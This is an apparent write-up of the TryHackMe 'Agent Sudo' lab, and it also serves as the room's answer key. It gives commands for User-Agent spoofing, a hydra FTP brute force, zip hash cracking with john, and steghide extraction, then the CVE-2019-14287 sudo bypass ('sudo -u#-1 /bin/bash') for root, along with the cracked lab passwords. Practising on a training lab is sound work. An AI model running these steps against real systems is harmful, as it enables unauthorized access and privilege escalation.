Agent Sudo (TRYHACKME) WriteUp
'''

#1	
How many open ports?
	nmap <ip>
Ans:-3
#2	
How you redirect yourself to a secret page?
Ans:- User-Agent
curl http://10.10.66.62 -H "User-Agent: C" - L

'''
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
'''

#3	
What is the agent name?
Ans:- chris


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#1	
FTP password

hydra -l chris -P /file/dest/rockyou.txt ftp://10.10.66.62
Answer :- crystal

#2	
Zip file password
binwalk -e image.png
zip2john file.zip > hash.txt
john hash.txt --wordlist=rockyou.txt
Answer :- alien

#3	
steg password
steghide extract -sf image.png
Answer :- Area51

#4	
Who is the other agent (in full name)?

Answer :- james

#5	
SSH password

Answer :- hackerrules

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#1
CVE number for the escalation 

(Format: CVE-xxxx-xxxx)

Answer: for priv-esc:- scp /location/linpeas.sh james@IP:/dev/shm

sudo -l tells us ->
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

CVE-2019-14287 : - To Get Root access we can try to mention a user that doesn't exists
sudo -u#-1 /bin/bash

#2	
What is the root flag?

Answer: ********************************
#3	
(Bonus) Who is Agent R?

